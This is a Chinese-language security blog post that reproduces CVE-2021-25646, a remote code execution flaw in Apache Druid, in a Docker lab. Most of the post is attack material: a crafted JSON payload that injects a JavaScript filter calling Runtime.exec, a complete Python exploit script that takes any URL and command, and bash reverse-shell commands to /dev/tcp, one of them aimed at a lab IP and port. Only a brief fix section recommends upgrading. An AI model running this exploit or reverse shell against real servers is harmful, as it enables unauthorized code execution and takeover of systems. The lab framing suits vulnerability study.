---
title: 2021-02-03-Apache Druid 远程代码执行漏洞（CVE-2021-25646）
tags: CVE-2021-25646,漏洞,ApacheDruid
renderNumberedHeading: true
grammar_cjkRuby: true
---


# Apache Druid 远程代码执行漏洞（CVE-2021-25646）

## 漏洞描述
> Apache Druid 是一个分布式的数据处理系统。Apache Druid包括执行用户提供的JavaScript的功能嵌入在各种类型请求中的代码。在Druid 0.20.0及更低版本中，用户发送恶意请求，利用Apache Druid漏洞可以执行任意代码。攻击者可直接构造恶意请求执行任意代码，控制服务器。

## 影响版本

> Apache Druid < 0.20.1

## 环境搭建

> 我们直接使用docker来搭建环境，docker搭建这里我就不说了，之前文章也有提到过

我们使用命令搜索 docker-druid `sudo docker search docker-druid`<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1612365138343.png)

下载镜像`sudo docker pull fokkodriesprong/docker-druid`<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1612365323577.png)

下载完成之后我们来启动一下 docker 镜像
`sudo docker run --rm -i -p 8888:8888  fokkodriesprong/docker-druid`
> docker run ：创建一个新的容器并运行一个命令
> --rm：容器退出时自动清理容器内部的文件系统
> -i：以交互模式运行容器，通常与 -t 同时使用
> -p：指定端口映射，格式为：主机(宿主)端口:容器端口

<br>

![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1612365651616.png)

## 漏洞复现

搭建好之后我们访问 `IP:8888` <br>
![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1612365846607.png)

可以看到Apache Druid 版本为 0.15.1

然后我们点击 `Load data` > `Local disk`<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1612366423082.png)

在最右侧的表单 `Base directory` 和 `File filter` 分别填入 `quickstart/tutorial/`和`wikiticker-2015-09-12-sampled.json.gz`<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1612366809923.png)

点击 `Preview`，然后一直点击Next<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1612366905212.png)

到 `Transform`的时候我们使用brup进行抓包，然后Next到 `Filter`<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1612367043020.png)
<br>
![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1612367146016.png)

原始数据包：
```
{"type":"index","spec":{"ioConfig":{"type":"index","firehose":{"type":"local","baseDir":"quickstart/tutorial/","filter":"wikiticker-2015-09-12-sampled.json.gz"}},"dataSchema":{"dataSource":"sample","parser":{"type":"string","parseSpec":{"format":"json","timestampSpec":{"column":"time","format":"iso"},"dimensionsSpec":{}}},"transformSpec":{"transforms":[]}}},"samplerConfig":{"numRows":500,"cacheKey":"f7e99d25faaa43d1813aba2a53529dd2"}}
```
我们替换为：
```
{"type":"index","spec":{"type":"index","ioConfig":{"type":"index","firehose":{"type":"local","baseDir":"/opt/","filter":""}},"dataSchema":{"dataSource":"sample","parser":{"type":"string","parseSpec":{"format":"json","timestampSpec":{"column":"time","format":"iso"},"dimensionsSpec":{}}},"transformSpec":{"transforms":[],"filter":{"type":"javascript",
"function":"function(value){return java.lang.Runtime.getRuntime().exec('ping XXXX')}",
"dimension":"added",
"":{
"enabled":"true"
}
}}}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}
```
其中执行命令的代码为：
```
"function":"function(value){return java.lang.Runtime.getRuntime().exec('ping XXXX')}"
```

接下来我们使用dnslog平台来进行漏洞复现，看是否能够执行成功
我们把命令更改为 `ping xxxx`<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1612367660820.png)

可以看到 dnslog 平台已经接收到数据了，证明漏洞可以利用

 也可以进行反弹shell的操作，只需要把命令更换成
 
 `/bin/bash -c $@|bash 0 echo bash -i >& /dev/tcp/ip/port 0>&1`
 
 
 ## Python脚本
 
 > 自己写了一个Python的小脚本，代码功底有点水，接下来展示一下我写的Python小脚本

Python脚本代码：
```python?linenums
# coding:utf-8
import requests
import sys


def exploit(url=''):
    header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 SE 2.X MetaSr 1.0',
              'Content-Type': 'application/json;charset=UTF-8'}
    payload = r'''
  {"type":"index","spec":{"type":"index","ioConfig":{"type":"index","firehose":{"type":"local","baseDir":"/opt/","filter":""}},"dataSchema":{"dataSource":"sample","parser":{"type":"string","parseSpec":{"format":"json","timestampSpec":{"column":"time","format":"iso"},"dimensionsSpec":{}}},"transformSpec":{"transforms":[],"filter":{"type":"javascript",
    "function":"function(value){return java.lang.Runtime.getRuntime().exec('%s')}",
    "dimension":"added",
    "":{
    "enabled":"true"
    }
    }}}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}
    ''' % poc
    response = requests.post(url+'/druid/indexer/v1/sampler?for=filter',headers=header,data=payload)

    if response.status_code == 404:
        print 'Response_status_code: ' + str(response.status_code)
        print '''
If Status 404 please remove '/'
    Example:
        http://wwww.xxxxxx.com/ is ERROR
        http://wwww.xxxxxx.com is right
        '''
    else:
        print 'Response_status_code: ' + str(response.status_code)
        print 'Response: ' + response.text


if __name__ == '__main__':
    try:
        url = sys.argv[1]
        poc = sys.argv[2]
        exploit(url)
    except IndexError:
        print '''
        ApacheDruid-CVE-2021-25646
        
        Dnslog Example:
            python ApacheDruid-CVE-2021-25646.py http://xxxxxxxxx.com "ping xxx.dnslog.cn" 
        Shell Example:
            python ApacheDruid-CVE-2021-25646.py http://xxxxxxxxx.com "/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/IP/PORT 0>&1"
        '''
        print 'Use: python ApacheDruid-CVE-2021-25646.py http://xxxxxxxxx.com "command"'
```

直接使用  `python ApacheDruid-CVE-2021-25646.py` 会有一些小提示
![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1612368028000.png)

`Dnslog` 测试：
`python ApacheDruid-CVE-2021-25646.py http://10.1.1.214:8888 "ping mrhat-test.jpdcb.l.dnslog.io"`<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1612368304394.png)

`反弹shell`测试：
先监听要反弹的端口 `6666`<br>
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1612368418845.png)

然后执行命令
`python ApacheDruid-CVE-2021-25646.py http://10.1.1.214:8888 "/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/10.1.1.223/6666 0>&1"`
![enter description here](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1612368546561.png)


## 修复方案
>升级到最新版 Apache Druid 0.20.1
下载链接：
https://druid.apache.org/downloads.html
https://github.com/apache/druid/releases/tag/druid-0.20.1

